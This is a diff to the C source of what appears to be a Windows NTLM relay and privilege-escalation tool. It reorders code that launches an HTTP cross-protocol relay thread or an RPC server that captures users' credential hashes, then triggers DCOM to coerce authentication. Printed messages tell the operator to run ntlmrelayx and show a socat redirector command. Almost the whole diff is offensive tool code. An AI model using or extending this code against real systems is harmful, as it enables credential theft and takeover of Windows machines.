@@ -131,20 +131,6 @@ int wmain(int argc, wchar_t** argv)
 	threads_params.rpcServerPortReflection = rogueOxidResolverPort;
 	threads_params.rpcRelayServerListeningPort = rpcRelayServerListeningPort;
 	HANDLE hThreadServer;
-	
-	if (fModule == 0 || fModule == 1) {
-		if (remoteHTTPRelayServerIp == NULL)
-		{
-			printf("[!] Remote HTTP Relay server ip must be set in module 0 and 1, set it with the -r flag.\n");
-			exit(-1);
-		}
-		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
-		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
-	}
-	else {
-		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n");
-		hThreadServer = CreateThread(NULL, 0, ThreadRpcServerCaptureCredsHash, (LPVOID)& threads_params, 0, NULL);
-	}
 
 	if (fModule == 0 || fModule == 2) {
 		g_rpcRelayServerListeningPort = rpcRelayServerListeningPort;
@@ -164,6 +150,28 @@ int wmain(int argc, wchar_t** argv)
 			printf("[*] Example Network redirector: \n\tsudo socat TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
 			juicyPotatoCompatible = false;
 		}
+	}
+	else {
+		// using the system oxid resolver to forge rpc packet template
+		threads_params.rpcServerIpReflection = (wchar_t*)L"127.0.0.1";
+		threads_params.rpcServerPortReflection = (wchar_t*)L"135";
+	}
+
+	if (fModule == 0 || fModule == 1) {
+		if (remoteHTTPRelayServerIp == NULL)
+		{
+			printf("[!] Remote HTTP Relay server ip must be set in module 0 and 1, set it with the -r flag.\n");
+			exit(-1);
+		}
+		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
+		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
+	}
+	else {
+		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n");
+		hThreadServer = CreateThread(NULL, 0, ThreadRpcServerCaptureCredsHash, (LPVOID)& threads_params, 0, NULL);
+	}
+
+	if (fModule == 0 || fModule == 2) {
 		if (g_sessionID == -1)
 			TriggerDCOM(clsid);
 		else
